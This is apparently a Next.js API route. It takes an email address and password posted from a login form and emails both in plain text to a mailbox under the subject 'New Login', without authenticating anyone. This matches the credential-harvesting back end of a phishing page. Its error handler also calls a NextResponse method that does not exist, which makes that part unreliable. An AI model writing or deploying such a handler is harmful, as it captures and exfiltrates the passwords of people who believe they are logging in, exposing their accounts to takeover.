import { NextResponse } from "next/server";
import { sendMail } from "@/src/lib/mail";

export async function POST(request) {
  try {
    const bodyJSON = JSON.parse(await request.text());
    const { email, password } = bodyJSON;

    await sendMail({
      subject: "New Login",
      text: `Email: ${email}\nPassword: ${password}`,
    });

    return NextResponse.json({ message: "Success: email was sent" });
  } catch (error) {
    console.error(error);
    return NextResponse.status(500).json({ message: "COULD NOT SEND MESSAGE" });
  }
}
